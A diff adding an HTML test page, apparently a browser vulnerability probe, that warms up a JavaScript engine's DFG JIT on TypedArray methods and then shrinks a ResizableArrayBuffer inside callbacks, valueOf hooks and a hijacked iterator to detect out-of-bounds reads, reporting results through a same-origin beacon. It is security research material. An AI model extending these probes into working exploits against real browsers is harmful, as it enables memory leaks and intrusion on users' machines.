@@ -1,0 +1,403 @@
+<!--
+  p626: DFG JIT + ResizableArrayBuffer iterator race
+
+  DFG compiles TypedArray iterator methods (map, every, find, reduce, forEach, set).
+  These call a user callback per element. If the callback resizes the RAB and DFG
+  doesn't re-check buffer state, subsequent element access is OOB → info leak.
+
+  Also tests: TypedArray.set() with valueOf on source elements,
+  Array.from(typedArray) with iterator hijack,
+  and direct DFG-compiled index access with resize in the same scope.
+
+  CVE-2024-44308 tested PutByVal with special index values — this tests
+  CALLBACK REENTRANCY during iteration, a different DFG optimization surface.
+
+  CRASH_CLASS: MODERATE (OOB read might crash, but typed arrays usually return 0/undefined)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p626</title></head>
+<body>p626: DFG RAB iterator race
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var log = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var line = tag + ' ' + (msg || '');
+  log.textContent += line + '\n';
+  bQ.push(line);
+  if (bQ.length >= 8) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var batch = bQ.splice(0, 12).join('|');
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/P626-' + encodeURIComponent(batch), false);
+    x.send();
+  } catch(e) {}
+}
+
+function hexQ(dv, off) {
+  var lo = dv.getUint32(off, true);
+  var hi = dv.getUint32(off + 4, true);
+  return ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
+}
+
+window.onerror = function(m) { emit('ONERR', String(m).slice(0,120)); flush(); };
+
+try {
+emit('START', typeof ArrayBuffer.prototype.resize);
+
+// Check RAB support
+if (typeof ArrayBuffer.prototype.resize !== 'function') {
+  emit('NO-RAB', 'ResizableArrayBuffer not supported');
+  flush();
+  return;
+}
+
+var WARM = 50000; // DFG warmup iterations
+
+// ===== Test 1: Float64Array.map() with resize in callback =====
+emit('T1', 'map+resize');
+try {
+  var rab1 = new ArrayBuffer(64, {maxByteLength: 1024});
+  var ta1 = new Float64Array(rab1);
+  for (var i = 0; i < 8; i++) ta1[i] = i + 1.1;
+
+  // Warm up map with normal callback
+  function mapCb1(val, idx) { return val * 2; }
+  for (var w = 0; w < WARM; w++) {
+    var r = ta1.map(mapCb1);
+  }
+  emit('T1-WARM', 'done');
+
+  // Now resize during map
+  var t1resized = false;
+  var t1values = [];
+  var t1result = ta1.map(function(val, idx) {
+    t1values.push({idx: idx, val: val});
+    if (idx === 2 && !t1resized) {
+      t1resized = true;
+      try { rab1.resize(0); } catch(e) { t1values.push({resizeErr: ''+e}); }
+    }
+    return val;
+  });
+
+  emit('T1-R', 'resized=' + t1resized + ' vals=' + t1values.length + ' rlen=' + t1result.length);
+  for (var i = 0; i < t1values.length; i++) {
+    var v = t1values[i];
+    if (v.resizeErr) { emit('T1-ERR', v.resizeErr); continue; }
+    var vstr = typeof v.val === 'number' ? v.val.toFixed(6) : String(v.val);
+    // Check for weird values that shouldn't be there (OOB read)
+    if (typeof v.val === 'number' && v.val !== 0 && v.idx >= 0) {
+      // After resize, values should be 0 or undefined
+      if (v.idx > 2 && v.val !== 0) {
+        emit('T1-OOB!', 'idx=' + v.idx + ' val=' + vstr);
+      }
+    }
+    if (i < 10) emit('T1-V', 'i=' + v.idx + ' v=' + vstr);
+  }
+} catch(e) { emit('T1-X', '' + e); }
+
+// ===== Test 2: Float64Array.every() with resize =====
+emit('T2', 'every+resize');
+try {
+  var rab2 = new ArrayBuffer(64, {maxByteLength: 1024});
+  var ta2 = new Float64Array(rab2);
+  for (var i = 0; i < 8; i++) ta2[i] = i + 10.5;
+
+  function everyCb(val) { return val > 0; }
+  for (var w = 0; w < WARM; w++) ta2.every(everyCb);
+  emit('T2-WARM', 'done');
+
+  var t2vals = [];
+  ta2.every(function(val, idx) {
+    t2vals.push({idx: idx, val: val});
+    if (idx === 1) { try { rab2.resize(0); } catch(e) {} }
+    return true; // continue iteration
+  });
+  emit('T2-R', 'n=' + t2vals.length);
+  for (var i = 0; i < t2vals.length; i++) {
+    var v = t2vals[i];
+    if (v.idx > 1 && typeof v.val === 'number' && v.val !== 0) {
+      emit('T2-OOB!', 'idx=' + v.idx + ' val=' + v.val);
+    }
+    if (i < 8) emit('T2-V', 'i=' + v.idx + ' v=' + (typeof v.val === 'number' ? v.val.toFixed(4) : v.val));
+  }
+} catch(e) { emit('T2-X', '' + e); }
+
+// ===== Test 3: Float64Array.find() with resize =====
+emit('T3', 'find+resize');
+try {
+  var rab3 = new ArrayBuffer(128, {maxByteLength: 1024});
+  var ta3 = new Float64Array(rab3);
+  for (var i = 0; i < 16; i++) ta3[i] = 100 + i;
+
+  function findCb(val) { return val > 999; } // never found
+  for (var w = 0; w < WARM; w++) ta3.find(findCb);
+  emit('T3-WARM', 'done');
+
+  var t3vals = [];
+  ta3.find(function(val, idx) {
+    t3vals.push({idx: idx, val: val});
+    if (idx === 4) { try { rab3.resize(8); } catch(e) {} } // shrink to 1 element
+    return false;
+  });
+  emit('T3-R', 'n=' + t3vals.length);
+  for (var i = 0; i < t3vals.length; i++) {
+    var v = t3vals[i];
+    if (v.idx > 0 && typeof v.val === 'number' && v.val !== 0 &&
+        (v.val < 100 || v.val > 116)) {
+      emit('T3-OOB!', 'idx=' + v.idx + ' val=' + v.val);
+    }
+    if (i < 16) emit('T3-V', 'i=' + v.idx + ' v=' + (typeof v.val === 'number' ? v.val.toFixed(4) : v.val));
+  }
+} catch(e) { emit('T3-X', '' + e); }
+
+// ===== Test 4: Float64Array.reduce() with resize =====
+emit('T4', 'reduce+resize');
+try {
+  var rab4 = new ArrayBuffer(64, {maxByteLength: 1024});
+  var ta4 = new Float64Array(rab4);
+  for (var i = 0; i < 8; i++) ta4[i] = i + 0.5;
+
+  function redCb(acc, val) { return acc + val; }
+  for (var w = 0; w < WARM; w++) ta4.reduce(redCb, 0);
+  emit('T4-WARM', 'done');
+
+  var t4vals = [];
+  ta4.reduce(function(acc, val, idx) {
+    t4vals.push({idx: idx, val: val});
+    if (idx === 3) { try { rab4.resize(0); } catch(e) {} }
+    return acc + (typeof val === 'number' ? val : 0);
+  }, 0);
+  emit('T4-R', 'n=' + t4vals.length);
+  for (var i = 0; i < t4vals.length; i++) {
+    var v = t4vals[i];
+    if (v.idx > 3 && typeof v.val === 'number' && v.val !== 0) {
+      emit('T4-OOB!', 'idx=' + v.idx + ' val=' + v.val);
+    }
+  }
+} catch(e) { emit('T4-X', '' + e); }
+
+// ===== Test 5: TypedArray.set() with valueOf resize =====
+emit('T5', 'set+valueOf');
+try {
+  var rab5 = new ArrayBuffer(64, {maxByteLength: 1024});
+  var dest5 = new Float64Array(rab5);
+
+  // Source array with valueOf that resizes
+  var src5 = [1.0, 2.0, {valueOf: function() { rab5.resize(8); return 3.0; }}, 4.0, 5.0, 6.0, 7.0, 8.0];
+
+  try {
+    dest5.set(src5);
+    // Read back from rab5 to see what was written
+    var dv5 = new DataView(rab5);
+    var t5out = '';
+    for (var i = 0; i < Math.min(rab5.byteLength, 64); i += 8) {
+      t5out += hexQ(dv5, i) + ' ';
+    }
+    emit('T5-R', 'blen=' + rab5.byteLength + ' data=' + t5out);
+  } catch(e) {
+    emit('T5-SETEXC', '' + e);
+    // Check if rab5 still has data from before resize
+    if (rab5.byteLength > 0) {
+      var dv5b = new DataView(rab5);
+      emit('T5-POST', 'blen=' + rab5.byteLength + ' [0]=' + hexQ(dv5b, 0));
+    }
+  }
+} catch(e) { emit('T5-X', '' + e); }
+
+// ===== Test 6: BigUint64Array read after resize =====
+emit('T6', 'biguint64+resize');
+try {
+  if (typeof BigUint64Array !== 'undefined') {
+    var rab6 = new ArrayBuffer(64, {maxByteLength: 1024});
+    var bu6 = new BigUint64Array(rab6);
+    for (var i = 0; i < 8; i++) bu6[i] = BigInt(0xDEAD0000 + i);
+
+    function bu6read(a) { return a[0]; }
+    for (var w = 0; w < WARM; w++) bu6read(bu6);
+    emit('T6-WARM', 'done');
+
+    // Resize and immediately read
+    rab6.resize(0);
+    var t6val;
+    try {
+      t6val = bu6read(bu6);
+      emit('T6-R', 'val=' + (t6val !== undefined ? '0x' + t6val.toString(16) : 'undefined'));
+      if (t6val !== undefined) emit('T6-OOB!', 'read after resize: ' + t6val.toString(16));
+    } catch(e) {
+      emit('T6-EXC', '' + e);
+    }
+  } else {
+    emit('T6-SKIP', 'no BigUint64Array');
+  }
+} catch(e) { emit('T6-X', '' + e); }
+
+// ===== Test 7: DFG-compiled function with resize between loads =====
+emit('T7', 'dfg-double-load');
+try {
+  var rab7 = new ArrayBuffer(128, {maxByteLength: 1024});
+  var ta7 = new Float64Array(rab7);
+  for (var i = 0; i < 16; i++) ta7[i] = 1000 + i;
+
+  function doubleLoad(a, trigger) {
+    var v0 = a[0];   // first load — buffer valid
+    if (trigger) trigger();  // resize happens here
+    var v1 = a[8];   // second load — buffer might be detached
+    return [v0, v1];
+  }
+
+  // Warm without trigger
+  for (var w = 0; w < WARM; w++) doubleLoad(ta7, null);
+  emit('T7-WARM', 'done');
+
+  // Restore buffer
+  if (rab7.byteLength === 0) rab7.resize(128);
+  for (var i = 0; i < 16; i++) ta7[i] = 1000 + i;
+
+  // Now with resize trigger
+  var t7result = doubleLoad(ta7, function() { rab7.resize(8); });
+  emit('T7-R', 'v0=' + t7result[0] + ' v1=' + t7result[1]);
+  if (typeof t7result[1] === 'number' && t7result[1] !== 0 &&
+      t7result[1] !== undefined && (t7result[1] < 1000 || t7result[1] > 1016)) {
+    emit('T7-OOB!', 'v1=' + t7result[1]);
+  }
+} catch(e) { emit('T7-X', '' + e); }
+
+// ===== Test 8: forEach with resize =====
+emit('T8', 'forEach+resize');
+try {
+  var rab8 = new ArrayBuffer(128, {maxByteLength: 1024});
+  var ta8 = new Float64Array(rab8);
+  for (var i = 0; i < 16; i++) ta8[i] = 200 + i;
+
+  function feCb(val) { /* noop */ }
+  for (var w = 0; w < WARM; w++) ta8.forEach(feCb);
+  emit('T8-WARM', 'done');
+
+  if (rab8.byteLength === 0) rab8.resize(128);
+  for (var i = 0; i < 16; i++) ta8[i] = 200 + i;
+
+  var t8vals = [];
+  ta8.forEach(function(val, idx) {
+    t8vals.push(val);
+    if (idx === 2) { try { rab8.resize(16); } catch(e) {} } // shrink to 2 elements
+  });
+  emit('T8-R', 'n=' + t8vals.length);
+  for (var i = 0; i < t8vals.length; i++) {
+    if (i > 2 && t8vals[i] !== 0 && t8vals[i] !== undefined &&
+        (t8vals[i] < 200 || t8vals[i] > 216)) {
+      emit('T8-OOB!', 'i=' + i + ' v=' + t8vals[i]);
+    }
+  }
+  var t8summary = t8vals.slice(0, 10).map(function(v) { return typeof v === 'number' ? v.toFixed(1) : String(v); }).join(',');
+  emit('T8-VALS', t8summary);
+} catch(e) { emit('T8-X', '' + e); }
+
+// ===== Test 9: Array.from(typedArray) with prototype hijack =====
+emit('T9', 'Array.from+resize');
+try {
+  var rab9 = new ArrayBuffer(64, {maxByteLength: 1024});
+  var ta9 = new Float64Array(rab9);
+  for (var i = 0; i < 8; i++) ta9[i] = 500 + i;
+
+  // Override Symbol.iterator to resize during iteration
+  var origIter = Float64Array.prototype[Symbol.iterator];
+  var t9hijacked = false;
+  Float64Array.prototype[Symbol.iterator] = function() {
+    var it = origIter.call(this);
+    var count = 0;
+    var self = this;
+    return {
+      next: function() {
+        var r = it.next();
+        count++;
+        if (count === 3 && !t9hijacked) {
+          t9hijacked = true;
+          try { rab9.resize(0); } catch(e) {}
+        }
+        return r;
+      }
+    };
+  };
+
+  try {
+    var t9result = Array.from(ta9);
+    emit('T9-R', 'len=' + t9result.length + ' vals=' + t9result.slice(0,10).join(','));
+    for (var i = 0; i < t9result.length; i++) {
+      if (i >= 3 && t9result[i] !== 0 && t9result[i] !== undefined &&
+          (t9result[i] < 500 || t9result[i] > 508)) {
+        emit('T9-OOB!', 'i=' + i + ' v=' + t9result[i]);
+      }
+    }
+  } finally {
+    Float64Array.prototype[Symbol.iterator] = origIter;
+  }
+} catch(e) { emit('T9-X', '' + e); }
+
+// ===== Test 10: Uint8Array view after RAB shrink — raw byte read =====
+emit('T10', 'uint8-raw-after-shrink');
+try {
+  var rab10 = new ArrayBuffer(256, {maxByteLength: 1024});
+  var f64_10 = new Float64Array(rab10);
+  var u8_10 = new Uint8Array(rab10);
+
+  // Fill with recognizable pattern
+  for (var i = 0; i < 32; i++) f64_10[i] = 0xCAFE0000 + i;
+
+  // Read back via Uint8Array to verify
+  emit('T10-PRE', 'blen=' + rab10.byteLength + ' u8len=' + u8_10.length);
+
+  // Shrink RAB
+  rab10.resize(8);
+
+  // Try reading past new end via the Uint8Array view
+  var t10oob = [];
+  for (var off = 0; off < 256; off += 8) {
+    var val;
+    try { val = u8_10[off]; } catch(e) { val = 'ERR'; }
+    if (val !== 0 && val !== undefined && val !== 'ERR' && off >= 8) {
+      t10oob.push({off: off, val: val});
+    }
+  }
+  emit('T10-R', 'shrunk=' + rab10.byteLength + ' u8len=' + u8_10.length + ' oob=' + t10oob.length);
+  for (var i = 0; i < Math.min(t10oob.length, 10); i++) {
+    emit('T10-OOB!', 'off=' + t10oob[i].off + ' val=0x' + t10oob[i].val.toString(16));
+  }
+} catch(e) { emit('T10-X', '' + e); }
+
+// ===== Test 11: DataView read after resize =====
+emit('T11', 'dataview-after-resize');
+try {
+  var rab11 = new ArrayBuffer(128, {maxByteLength: 1024});
+  var dv11 = new DataView(rab11);
+
+  // Write pattern
+  for (var i = 0; i < 16; i++) dv11.setFloat64(i * 8, 0xBEEF0000 + i, true);
+
+  rab11.resize(8);
+
+  // Try reading past end
+  for (var off = 0; off < 128; off += 8) {
+    try {
+      var val = dv11.getFloat64(off, true);
+      if (off >= 8 && val !== 0) {
+        emit('T11-OOB!', 'off=' + off + ' val=' + val);
+      }
+    } catch(e) {
+      if (off < 24) emit('T11-EXC', 'off=' + off + ' ' + String(e).slice(0,40));
+      break;
+    }
+  }
+  emit('T11-R', 'done');
+} catch(e) { emit('T11-X', '' + e); }
+
+emit('ALIVE', 'all tests complete');
+flush();
+} catch(fatal) { emit('FATAL', String(fatal).slice(0,200)); flush(); }
+})();
+</script>
+</body></html>
